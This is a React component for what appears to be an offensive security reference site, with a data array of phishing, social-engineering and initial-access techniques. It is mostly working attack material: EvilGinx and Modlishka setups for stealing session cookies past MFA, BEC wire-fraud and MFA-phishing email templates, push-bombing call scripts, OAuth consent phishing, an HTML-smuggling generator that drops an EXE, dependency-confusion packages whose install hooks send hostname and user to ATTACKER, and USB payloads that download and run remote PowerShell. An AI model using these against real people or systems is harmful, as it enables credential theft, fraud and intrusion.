import React from 'react';
import TechniqueCard from '../TechniqueCard';

const techniques = [
  {
    id: 'phishing-osint',
    title: 'OSINT & Target Profiling',
    subtitle: 'Build a detailed intelligence picture of targets before crafting pretexts',
    tags: ['LinkedIn', 'Hunter.io', 'theHarvester', 'Maltego', 'Recon-ng', 'email pattern'],
    steps: [
      'Enumerate employees via LinkedIn: job titles, departments, reporting structure, recent activity',
      'Discover email format from Hunter.io, LinkedIn, or GitHub commits (firstname.lastname@corp.com)',
      'Identify key targets: IT admins, finance, executives, HR — high-value or high-trust roles',
      'Profile the organization: technologies used (job postings), vendors, recent news/events (mergers, product launches)',
      'Map trust relationships: find who reports to whom, external vendors, contractors',
      'Use theHarvester to enumerate emails, subdomains, employee names from public sources',
      'Check past breach data (HaveIBeenPwned, DeHashed) for existing credential reuse',
    ],
    commands: [
      {
        title: 'Email & employee enumeration',
        code: `# theHarvester — emails, subdomains, hosts
theHarvester -d target.com -l 500 -b google,linkedin,bing,hunter

# Hunter.io — discover email format
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY" | jq

# Validate discovered emails (SMTP VRFY / RCPT TO)
python3 -c "
import smtplib
s = smtplib.SMTP('mail.target.com')
s.set_debuglevel(1)
s.verify('user@target.com')     # VRFY command
# Or check RCPT TO response code (250 = valid, 550 = invalid)
"

# LinkedIn company employee scrape
linkedin2username.py -u 'your@email.com' -p 'password' -c 'Target Company'
# Generates username list in common formats: jsmith, john.smith, johns, etc.

# recon-ng
recon-ng
> marketplace install all
> modules load recon/domains-contacts/hunter_io
> options set SOURCE target.com
> run

# Breach data — check for valid credentials
curl "https://haveibeenpwned.com/api/v3/breachedaccount/{email}" \\
  -H "hibp-api-key: YOUR_KEY"

# dehashed.com API — search for passwords by domain
curl "https://api.dehashed.com/search?query=email:@target.com" \\
  -H "Authorization: Basic $(echo -n 'user:apikey' | base64)"`
      },
      {
        title: 'LinkedIn OSINT',
        code: `# Manual LinkedIn profiling
# 1. Search: site:linkedin.com "target company" "IT Manager"
# 2. Build org chart: who reports to CISO, IT Director, etc.

# CrossLinked — enumerate LinkedIn employees without account
python3 CrossLinked.py -f '{first}.{last}@target.com' "Target Company"
# Outputs: john.smith@target.com, jane.doe@target.com, ...

# PhoneBook.cz — bulk email enumeration
# https://phonebook.cz/ → search domain → export email list

# Identify technology stack from job postings
# "Experience with Okta, CrowdStrike, Azure AD" →
# → confirm SSO, EDR, identity provider for pretexts

# Recent company events (newsworthy pretexts)
google dork: site:target.com "merger" OR "acquisition" OR "new system" OR "upgrade" inurl:press`
      }
    ]
  },
  {
    id: 'phishing-pretexting',
    title: 'Pretexting & Scenario Development',
    subtitle: 'Build believable scenarios that create urgency and exploit trust',
    tags: ['pretexting', 'urgency', 'authority', 'trust', 'scenario', 'social proof'],
    steps: [
      'Choose a pretext category: IT/security notification, HR/payroll, executive directive, vendor/partner, shared document',
      'Authority + urgency = highest click rate — "Action required by your IT Security team within 24 hours"',
      'Mirror actual communications: clone real email templates, use actual IT department email signatures',
      'IT security pretexts: "MFA re-enrollment required", "Suspicious login detected — verify your account"',
      'HR pretexts: "Q4 bonus payment — update banking details", "Open enrollment deadline", "HR policy acknowledgment"',
      'Finance pretexts: "Invoice requires approval", "Payment authorization needed — CFO directive"',
      'Vendor/partner: "New contract terms require e-signature", "Shared file from [known vendor]"',
      'Executive impersonation (BEC): spoof or compromise CEO/CFO email — wire transfer requests, W-2 requests',
    ],
    commands: [
      {
        title: 'High-conversion pretext templates',
        code: `# IT Security / MFA Enrollment Pretext
Subject: [ACTION REQUIRED] Multi-Factor Authentication Re-Enrollment — Deadline: Friday

Body:
Dear {FirstName},

As part of our ongoing security hardening initiative, all employees are required
to re-enroll their MFA device by Friday, {Date}.

Failure to complete re-enrollment will result in account lockout on Monday morning.

Please complete the process here: https://mfa-portal.corp-login.com/enroll

If you have any questions, contact the IT Help Desk at itsupport@corp.com.

[IT Security Team]
[Company Logo]
[Actual IT Team Signature Block]

# HR Payroll Pretext
Subject: Payroll Direct Deposit Update — Action Required

Please verify your banking information for the upcoming Q4 bonus payment.
Update your details here: [LINK]
Deadline: {Date} at 5:00 PM.

# Shared Document Pretext (impersonating a colleague)
Subject: {ColleagueName} shared "Q4 Budget Review.xlsx" with you

{ColleagueName} has shared a document with you via the company portal.
Click here to view: [LINK]`
      },
      {
        title: 'BEC — Business Email Compromise',
        code: `# BEC wire transfer request (spoofed CFO email)
From: cfo@corp.com (spoofed)
To: accountspayable@corp.com
Subject: Urgent Wire Transfer — Confidential

Hi {Name},

I need you to process an urgent wire transfer for an acquisition we're finalizing.
This is time-sensitive and confidential — please do not discuss with others.

Amount: $127,500
Beneficiary: [Attacker account details]
Reference: Invoice #2025-0847

Please confirm once processed. I'm in meetings all day but will check email.

Thanks,
{CFO Name}

# Key BEC tactics:
# 1. Send from lookalike domain: corp-finance.com vs corp.com
# 2. Reply-To header points to attacker email
# 3. Target: AP clerk, controller — not CFO's direct team
# 4. Timing: near end of quarter, during exec travel`
      }
    ]
  },
  {
    id: 'phishing-email-delivery',
    title: 'Email Phishing — Setup & Delivery',
    subtitle: 'Configure a high-deliverability phishing pipeline from scratch',
    tags: ['GoPhish', 'swaks', 'SPF', 'DKIM', 'DMARC', 'spam score', 'mail relay'],
    steps: [
      'Purchase a lookalike domain: corp-it.com, corp-helpdesk.net, c0rp.com — check similarity to target',
      'Configure DNS: A record → mail server IP, MX record → mail server, PTR record (reverse DNS must match)',
      'Set up SPF: v=spf1 ip4:<MAIL_IP> -all — authorizes your server to send for the domain',
      'Generate DKIM keys and add TXT record — cryptographically signs outbound mail',
      'Set DMARC: p=none (monitoring) or p=reject (enforcement) — affects deliverability to Gmail/O365',
      'Test spam score with mail-tester.com before sending campaign — aim for 9+/10',
      'Configure GoPhish with sending profile, template, landing page, and target list',
      'Warm up the domain: send low-volume clean email for 1-2 weeks before phishing campaign',
    ],
    commands: [
      {
        title: 'Postfix SMTP server setup',
        code: `# Install Postfix
apt install postfix opendkim opendkim-tools -y

# /etc/postfix/main.cf
myhostname = mail.corp-it.com
mydomain = corp-it.com
myorigin = $mydomain
inet_interfaces = all
smtpd_tls_cert_file = /etc/letsencrypt/live/corp-it.com/fullchain.pem
smtpd_tls_key_file = /etc/letsencrypt/live/corp-it.com/privkey.pem
smtp_tls_security_level = may
smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination

# Set up DKIM signing
mkdir /etc/opendkim/keys/corp-it.com
opendkim-genkey -b 2048 -d corp-it.com -D /etc/opendkim/keys/corp-it.com -s mail -v
# Add public key to DNS: mail._domainkey.corp-it.com TXT "v=DKIM1; k=rsa; p=<PUBKEY>"

# /etc/opendkim.conf
Domain corp-it.com
KeyFile /etc/opendkim/keys/corp-it.com/mail.private
Selector mail
Socket inet:12301@localhost

systemctl restart postfix opendkim`
      },
      {
        title: 'GoPhish campaign configuration',
        code: `# Download GoPhish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*.zip && chmod +x gophish

# config.json — bind to localhost behind nginx reverse proxy
{
  "admin_server": {"listen_url": "127.0.0.1:3333", "use_tls": true},
  "phish_server": {"listen_url": "0.0.0.0:8080", "use_tls": false},
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}

./gophish

# GoPhish setup sequence:
# 1. Sending Profile: SMTP host, from address, SMTP auth
# 2. Email Template: HTML body with tracking pixel, {{.URL}} for link
# 3. Landing Page: cloned login page capturing {{.Email}}, {{.Password}}
# 4. Users & Groups: import CSV of targets (First Name, Last Name, Email, Position)
# 5. Campaign: link above components, set launch time, URL

# Track results:
# - Emails Sent / Opened / Clicked / Submitted Data`
      },
      {
        title: 'Deliverability testing & domain warmup',
        code: `# Test spam score (aim for 9+/10)
# Send test email to check-auth@verifier.port25.com
swaks --to check-auth@verifier.port25.com --from test@corp-it.com \\
  --server mail.corp-it.com --tls

# mail-tester.com — get a unique test address, send your phishing email to it
# Checks: SPF, DKIM, DMARC, spam content, blacklists

# Check if domain/IP is blacklisted
curl "https://api.mxtoolbox.com/api/v1/Lookup/blacklist/?argument=mail.corp-it.com&Authorization=YOUR_KEY"

# Domain warmup schedule (avoid immediate large sends)
# Week 1: 10-20 emails/day to personal Gmail/Yahoo accounts
# Week 2: 50-100/day, check inbox delivery
# Week 3: 200-500/day
# Then: full campaign launch

# Test if email reaches inbox vs spam for target mail provider
swaks --to testaccount@target.com --from noreply@corp-it.com \\
  --server mail.corp-it.com --tls \\
  --header "Subject: Test" --body "Hello"
# Check: does it land in inbox or spam?`
      }
    ]
  },
  {
    id: 'phishing-evilginx',
    title: 'AiTM Phishing — EvilGinx3 & Modlishka',
    subtitle: 'Adversary-in-the-Middle phishing to bypass MFA and steal session tokens',
    tags: ['EvilGinx3', 'AiTM', 'MFA bypass', 'session cookie', 'phishlets', 'O365', 'Okta'],
    steps: [
      'AiTM (Adversary-in-The-Middle): EvilGinx proxies the real site — victim logs in for real but you intercept the session cookie',
      'Works against all MFA methods except hardware FIDO2 keys (TOTP, SMS, push notifications all bypassed)',
      'Set up EvilGinx on a VPS, configure phishlet for target app (O365, Okta, Google Workspace)',
      'DNS: point phishing domain A record to EvilGinx VPS — EvilGinx handles SSL automatically',
      'Create a lure URL and send to target — when they log in, their authenticated session cookie is captured',
      'Import stolen cookie into browser — full authenticated access without knowing the password or MFA code',
      'Move fast: session cookies expire or get revoked — use within minutes to hours of capture',
    ],
    commands: [
      {
        title: 'EvilGinx3 full setup',
        code: `# Install EvilGinx3
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && go build -o evilginx main.go

# Start EvilGinx (runs on ports 80, 443, 53)
./evilginx -p ./phishlets -t ./redirectors

# Initial configuration
config domain phishdomain.com       # Your phishing domain
config ipv4 external <VPS_IP>       # Your VPS public IP
config unauth_url https://microsoft.com  # Redirect non-targets

# List available phishlets
phishlets

# Configure O365 phishlet
phishlets hostname o365 login.phishdomain.com
phishlets enable o365

# Verify SSL cert auto-provisioned
phishlets get-hosts o365
# Add these records to your DNS:
# login.phishdomain.com → <VPS_IP>
# www.login.phishdomain.com → <VPS_IP>

# Create lure URL
lures create o365
lures edit 0 redirect_url https://outlook.office.com
lures get-url 0
# Output: https://login.phishdomain.com/AbCdEf123

# Monitor sessions
sessions
sessions 1      # View captured tokens for session 1
# Shows: username, password, session cookies (token_json)`
      },
      {
        title: 'Using captured tokens',
        code: `# EvilGinx captures tokens in JSON format
# Extract the token from: sessions 1 → token field

# Method 1: Cookie Editor browser extension
# Import JSON cookies into browser → navigate to target → already authenticated

# Method 2: Python with requests
import requests, json
cookies = json.loads('''<TOKEN_JSON>''')
session = requests.Session()
for c in cookies:
    session.cookies.set(c['name'], c['value'], domain=c['domain'])

# Access O365 with stolen cookie
r = session.get('https://outlook.office365.com/owa/')
print(r.status_code)  # 200 = success

# Method 3: Graph API access with stolen token
# Extract Bearer token from captured cookies
curl -H "Authorization: Bearer <ACCESS_TOKEN>" \\
  "https://graph.microsoft.com/v1.0/me/messages" | jq

# Persist access: register attacker-controlled MFA device using stolen session
# Microsoft: go to https://aka.ms/mfasetup with stolen cookie → add new authenticator`
      },
      {
        title: 'Microsoft AiTM at scale (Modlishka)',
        code: `# Modlishka — AiTM reverse proxy
git clone https://github.com/drk1wi/Modlishka
cd Modlishka && go build -o modlishka main.go

# Configuration file
cat > phishing.json << 'EOF'
{
  "proxyDomain": "phishdomain.com",
  "listeningAddress": "0.0.0.0",
  "target": "login.microsoftonline.com",
  "targetResources": "login.microsoftonline.com,account.microsoft.com",
  "targetRules": "",
  "terminateTriggers": "",
  "terminateRedirectUrl": "https://microsoft.com",
  "trackingCookie": "id",
  "trackingParam": "track",
  "jsRules": "",
  "forceHTTPS": true,
  "forceHTTP": false,
  "dynamicMode": false,
  "credParams": "username[name=loginfmt],password[name=passwd]",
  "certPEM": "/etc/letsencrypt/live/phishdomain.com/fullchain.pem",
  "keyPEM": "/etc/letsencrypt/live/phishdomain.com/privkey.pem",
  "logPostRequests": true,
  "logRequestFile": "/tmp/modlishka_creds.log",
  "disableSecurity": false,
  "debug": true
}
EOF

./modlishka -config phishing.json`
      }
    ]
  },
  {
    id: 'phishing-teams-slack',
    title: 'Microsoft Teams & Slack Phishing',
    subtitle: 'Abuse collaboration platforms for credential theft and payload delivery',
    tags: ['Teams', 'Slack', 'TeamsPhisher', 'external tenant', 'GIF attack', 'OAuth'],
    steps: [
      'Teams: by default, external users can message internal employees via federated chat',
      'Create a malicious Teams tenant impersonating IT support — message employees directly',
      'TeamsPhisher: automates sending phishing messages to internal Teams users from external tenant',
      'Attach malicious files in Teams chat — files shared via SharePoint/OneDrive links (trusted)',
      'Slack: join public workspaces, target users in shared channels, DM with pretexts',
      'OAuth app phishing: craft a malicious OAuth app requesting Mail.Read, Files.ReadWrite — user consents and grants access',
      'Teams GIF attack (CVE-2020-1265 pattern): malicious animated GIF forced tenant-to-tenant token exchange',
    ],
    commands: [
      {
        title: 'TeamsPhisher — Teams phishing',
        code: `# TeamsPhisher — send phishing messages from external MS Teams tenant
git clone https://github.com/Octoberfest7/TeamsPhisher
pip3 install -r requirements.txt

# Prerequisites:
# - Microsoft 365 dev account (free tier works)
# - Attacker Teams tenant configured
# - Target user email address

# Send message with malicious SharePoint link
python3 TeamsPhisher.py \\
  -u attacker@yourtenant.onmicrosoft.com \\
  -p 'Password123!' \\
  -m "Hi, this is IT support. We've detected suspicious activity on your account. Please verify: https://malicious-link.com" \\
  -l targets.txt

# Send with attachment (hosted on attacker SharePoint)
python3 TeamsPhisher.py \\
  -u attacker@yourtenant.onmicrosoft.com \\
  -p 'Password123!' \\
  -m "Please review the attached security policy document." \\
  -a "https://yourtenant.sharepoint.com/sites/share/payload.exe" \\
  -l targets.txt`
      },
      {
        title: 'OAuth consent phishing (illicit consent grant)',
        code: `# Register malicious OAuth app in Azure AD
# Azure Portal → App Registrations → New registration
# Name: "Microsoft 365 Security Scanner" (or any trusted-sounding name)
# Redirect URI: https://attacker-callback.com/auth

# Request high-privilege permissions:
# Microsoft Graph: Mail.Read, Mail.ReadWrite, Files.ReadWrite.All,
#                  User.Read.All, Contacts.Read, offline_access

# Craft consent URL
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<YOUR_APP_CLIENT_ID>
  &response_type=code
  &redirect_uri=https://attacker-callback.com/auth
  &scope=Mail.Read+Files.ReadWrite.All+User.Read.All+offline_access
  &state=12345

# Send this URL in phishing email:
# "Please authorize the security scanner to audit your account"
# User clicks "Accept" → you receive auth code + refresh token

# Exchange code for token
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \\
  -d "client_id=<APP_ID>&client_secret=<SECRET>&code=<AUTH_CODE>&grant_type=authorization_code&redirect_uri=https://attacker-callback.com/auth"

# Use token to read victim's email
curl -H "Authorization: Bearer <ACCESS_TOKEN>" \\
  "https://graph.microsoft.com/v1.0/users/<VICTIM_EMAIL>/messages?\\$top=50" | jq`
      }
    ]
  },
  {
    id: 'phishing-smishing-vishing',
    title: 'Vishing, Smishing & Multi-Channel Attacks',
    subtitle: 'Voice phishing, SMS attacks, and combined multi-channel social engineering',
    tags: ['vishing', 'smishing', 'MFA fatigue', 'push bombing', 'caller ID spoof', 'Twilio'],
    steps: [
      'Vishing (voice phishing): call target impersonating IT helpdesk, HR, or bank — extract credentials or OTP codes',
      'Use caller ID spoofing to appear as internal company number or bank number',
      'MFA push bombing: flood target with Authenticator push notifications until they accidentally approve',
      'MFA fatigue + vishing: bomb with pushes, then call claiming "IT security" and instruct them to "approve the prompt"',
      'Smishing: SMS-based phishing with malicious links — very high open rates vs email',
      'Multi-channel attack: email + SMS + Teams message simultaneously — extreme urgency and legitimacy',
      'Pretexts: "Your account is compromised", "Verify your VPN access", "Approve the security scan"',
    ],
    commands: [
      {
        title: 'MFA push bombing + vishing',
        code: `# MFA push bombing — automated password spray to trigger Authenticator pushes
# Use spray tools to continuously authenticate, each attempt sends a push notification
# Target gets dozens of pushes in minutes → eventually approves out of frustration or confusion

# Spray with intentionally wrong password to trigger pushes repeatedly:
# Note: some setups trigger push even on invalid password if username is valid

# Combined attack workflow:
# Step 1: Enumerate valid credentials (spray campaign, breach data)
# Step 2: Begin push bombing (automated login attempts with correct password)
# Step 3: Call victim immediately while bombs are ongoing:

# Call script:
"Hi, this is Mike from the IT Security team. We've detected suspicious login attempts
on your account from an overseas IP address. I need to verify it's you.
You should be receiving a Microsoft Authenticator notification right now —
can you please approve it so I can confirm your identity and lock out the attacker?"

# Result: victim approves the push → you get the session token → full access

# Vishing number spoofing
# Use VoIP providers that allow outbound caller ID spoofing:
# - spoofcard.com
# - twilio.com (programmable voice)
# - voip.ms`
      },
      {
        title: 'SMS phishing (smishing)',
        code: `# Twilio — send bulk SMS
pip3 install twilio

from twilio.rest import Client
client = Client('ACCOUNT_SID', 'AUTH_TOKEN')

targets = ['+14155551234', '+14155555678']
message_body = "ALERT: Unusual sign-in to your Microsoft account. Verify immediately: https://corp-verify.com/auth"

for number in targets:
    message = client.messages.create(
        body=message_body,
        from_='+15005550006',   # Your Twilio number
        to=number
    )
    print(f"Sent to {number}: {message.sid}")

# SMS spoofing services (use Twilio alpha sender ID for spoofed names)
# Set alpha sender: "Microsoft" or "Corp IT" in some regions
# From: "Microsoft" → To: victim
# Message: "Your account requires verification. Click: https://..."

# Combine with AiTM:
# SMS link → EvilGinx O365 phishlet → captures session cookie + MFA`
      }
    ]
  },
  {
    id: 'phishing-linkedin',
    title: 'LinkedIn & Social Media Social Engineering',
    subtitle: 'Build fake personas and exploit professional networks for access',
    tags: ['LinkedIn', 'fake persona', 'watering hole', 'spear phishing', 'connection request', 'InMail'],
    steps: [
      'Create a convincing fake LinkedIn persona: real-looking profile, connections, work history',
      'Use AI-generated profile photo (thispersondoesnotexist.com) to avoid reverse image search',
      'Build the persona: 500+ connections, work history at known companies, endorsements',
      'Target employees via connection request → build rapport → deliver malicious link or payload',
      'Useful pretexts: recruiter sharing a job description (PDF payload), vendor sharing a proposal, colleague sharing a document',
      'LinkedIn InMail from a "Microsoft" or "CISA" account with "security advisory" — very high open rates',
      'Use LinkedIn to identify security team members for targeted evasion research',
    ],
    commands: [
      {
        title: 'LinkedIn persona & campaign workflow',
        code: `# Fake persona checklist:
# Profile photo: thispersondoesnotexist.com (GAN-generated, no reverse image match)
# Name: use common regional name matching profile ethnicity
# Headline: "IT Security Consultant | Cybersecurity Advisor"
# Work history: real companies, generic roles, 1-2 years each
# Connections: 500+ (buy or organically build over months)
# Posts: share industry articles weekly for 1-2 months before attacking
# Education: real university, generic degree
# Endorsements: trade endorsements with other fake accounts

# Spear phishing via LinkedIn DM:
"Hi {FirstName}, I came across your profile while researching
{TargetCompany}'s security posture. I'm a senior consultant at [Fake Firm]
and we've published a threat intel report specifically relevant to your industry.
Would you be open to a quick call? In the meantime, here's the executive summary:
[malicious link/PDF]"

# Recruiter pretext (extremely high response rate):
"Hi {FirstName}, I'm recruiting for a senior InfoSec role at [prestigious company].
The comp range is $220-260k + equity. I've attached the job description —
would love to hear your thoughts: [malicious PDF link]"

# PDF payload via LinkedIn:
# Deliver PDF via Google Drive / Dropbox link (trusted domains)
# PDF contains malicious macro or embedded exploit
# Or: link to HTML smuggling page that drops EXE`
      }
    ]
  },
  {
    id: 'phishing-payload-delivery',
    title: 'Payload Delivery — Bypass Email Gateways',
    subtitle: 'Get malicious payloads past SEG, Defender, and sandboxes',
    tags: ['HTML smuggling', 'ISO', 'LNK', 'OneNote', 'PDF', 'password protected', 'macro', 'MOTW'],
    steps: [
      'Password-protected ZIP/RAR: most SEGs cannot scan inside password-protected archives — include password in email body',
      'HTML smuggling: payload assembled client-side in JavaScript — SEG scans clean HTML, payload appears on disk after open',
      'ISO/IMG: files inside ISO containers do not inherit MOTW (Mark of the Web) on older Windows — no SmartScreen warning',
      'OneNote attachments: .one files can embed executables — double-click triggers execution (patched in newer builds)',
      'PDF with embedded link: PDF passes SEG scan, link inside redirects to payload hosting',
      'Macro documents: still work against older Office versions or when macros enabled by policy',
      'Microsoft Office add-ins (.xll, .xlam): loaded by Excel, high trust level, rarely blocked',
      'Cloud delivery: host payload on OneDrive/SharePoint/Google Drive — trusted domains bypass URL filters',
    ],
    commands: [
      {
        title: 'HTML smuggling payload',
        code: `# Generate HTML smuggling page from payload
python3 -c "
import base64
payload = open('beacon.exe', 'rb').read()
b64 = base64.b64encode(payload).decode()
html = f'''<html><body>
<script>
function b64ToBuf(b64) {{
  var bin = atob(b64), buf = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
  return buf;
}}
var payload = '{b64}';
var blob = new Blob([b64ToBuf(payload)], {{type: 'application/octet-stream'}});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'SecurityScan.exe';
document.body.appendChild(a);
a.click();
</script>
<p style='font-family:Segoe UI;color:#0078d4'>
<b>Microsoft Security Advisory</b><br>
Downloading security assessment tool...
</p>
</body></html>'''
open('advisory.html','w').write(html)
print('Done: advisory.html')
"

# Password-protected ZIP delivery
zip -P infected archive.zip payload.exe
# Email: "Please use password: winter2025 to extract the document"

# ISO with DLL sideload
mkisofs -o Report.iso -J -r ./payload_dir/
# payload_dir/ contains: signed_legit.exe + malicious.dll + decoy.pdf`
      },
      {
        title: 'Cloud-hosted payload delivery',
        code: `# OneDrive/SharePoint delivery (trusted domain)
# Upload payload to OneDrive, copy sharing link
# https://1drv.ms/u/s!... → high trust, passes most URL filters

# Google Drive delivery
# Share malicious file from Google Drive
# Link: https://drive.google.com/file/d/<ID>/view
# - Trusted domain bypasses SEG URL scanning
# - Use .gdrive embedded shortcut pointing to malicious EXE

# Dropbox Paper with embedded iframe (loads HTML smuggling)
# Dropbox Paper allows embedding external URLs via iframe in some configs

# SharePoint-hosted phishing page
# Create a SharePoint site on free trial tenant
# Host EvilGinx-style credential capture page
# URL: https://<tenant>.sharepoint.com/sites/... → trusted Microsoft domain

# GitHub raw content (trusted CDN delivery)
# Upload payload to private GitHub repo
# Generate raw.githubusercontent.com link
# Or: host HTML smuggling page in a GitHub Pages site`
      }
    ]
  },
  {
    id: 'supply-chain',
    title: 'Supply Chain',
    subtitle: 'Compromise through trusted third-party dependencies and CI/CD pipelines',
    tags: ['package manager', 'CI/CD', 'dependency confusion', 'npm', 'PyPI'],
    steps: [
      'Identify internal package names via OSINT (GitHub, job postings, error messages)',
      'Register similarly named packages on public registries (dependency confusion attack)',
      'Compromise CI/CD pipelines to inject malicious code in build processes',
      'Target trusted vendor software updates as a delivery mechanism',
      'Monitor which internal packages get resolved from public registries vs internal ones',
    ],
    commands: [
      {
        title: 'Dependency confusion',
        code: `# Create malicious package with higher version number
# package.json
{
  "name": "internal-company-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://ATTACKER/callback?hostname=$(hostname)&user=$(whoami)"
  }
}

# Publish to npm
npm publish

# Python — PyPI dependency confusion
# setup.py
from setuptools import setup
import subprocess
setup(
    name='internal-corp-utils',
    version='99.0.0',
    install_requires=[],
)
subprocess.run(['curl', 'https://ATTACKER/callback?h=' + __import__('socket').gethostname()])`
      }
    ]
  },
  {
    id: 'physical',
    title: 'Physical Access',
    subtitle: 'Gain initial access through physical implants and USB attacks',
    tags: ['USB drop', 'Rubber Ducky', 'implant', 'BadUSB', 'Bash Bunny'],
    steps: [
      'Prepare USB devices with autorun payloads or BadUSB firmware (Rubber Ducky, Bash Bunny)',
      'Configure payload to execute within seconds of insertion',
      'Drop devices in target locations (parking lots, reception areas, meeting rooms)',
      'For network implants: configure device for remote access to internal network (LAN Turtle, Shark Jack)',
      'Label USB as "Salary Review 2025" or "Confidential HR" — increases pickup rate',
    ],
    commands: [
      {
        title: 'Rubber Ducky payload',
        code: `# DuckyScript — download and execute via PowerShell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://ATTACKER/stager.ps1')"
ENTER

# Bash Bunny — switch mode to HID + storage
# payloads/switch1/payload.txt
ATTACKMODE HID STORAGE
LED ATTACK
QUACK GUI r
QUACK DELAY 500
QUACK STRING powershell -ep bypass -w hidden "IEX(IRM https://ATTACKER/s.ps1)"
QUACK ENTER
LED FINISH`
      }
    ]
  },
  {
    id: 'driveby',
    title: 'Drive-by / Watering Hole',
    subtitle: 'Compromise users via malicious websites, browser exploits, and SEO poisoning',
    tags: ['browser exploit', 'SEO poison', 'malvertising', 'BeEF', 'watering hole'],
    steps: [
      'Identify websites frequently visited by target employees (industry forums, portals, vendor sites)',
      'Compromise the site via XSS/SQLi or inject content via ad network to deliver browser exploits',
      'SEO poisoning: create high-ranking pages for search terms target employees use',
      'Use BeEF (Browser Exploitation Framework) to hook browsers and pivot to internal network',
      'Deliver signed/legitimate-looking executables via download prompts or update dialogs',
      'Malvertising: buy ad slots on industry sites — serve malicious JS to targeted visitors',
    ],
    commands: [
      {
        title: 'BeEF browser hooking',
        code: `# Start BeEF
cd /usr/share/beef-xss && ./beef

# Inject hook into watering hole page (via XSS or compromised site)
<script src="http://ATTACKER:3000/hook.js"></script>

# BeEF — network discovery from victim browser
curl http://ATTACKER:3000/api/modules/run \\
  -H "Content-Type: application/json" \\
  -d '{"token":"API_TOKEN","session":"HOOKED_SESSION","module":"Network Discovery","options":{"ipRange":"192.168.0.1-254"}}'

# SEO poisoning — target common employee searches
# Example: "corp-helpdesk password reset" → rank malicious lookalike page
# Serve HTML smuggling payload to visitors from target domain
# Track via referrer header: Referer: https://www.google.com/...`
      }
    ]
  },
];

export default function PhishingSocialEngineering() {
  return (
    <div>
      <h2 className="font-mono text-lg font-bold text-emerald-400 mb-2">Phishing, Social Engineering & Delivery</h2>
      <p className="text-slate-500 text-sm mb-6">OSINT profiling • Pretexting • Email delivery • AiTM • Teams/Slack • Vishing • Payload bypass • Supply Chain • Physical</p>
      <div className="grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard
              title={t.title}
              subtitle={t.subtitle}
              tags={t.tags}
              accentColor="green"
              steps={t.steps}
              commands={t.commands}
            />
          </div>
        ))}
      </div>
    </div>
  );
}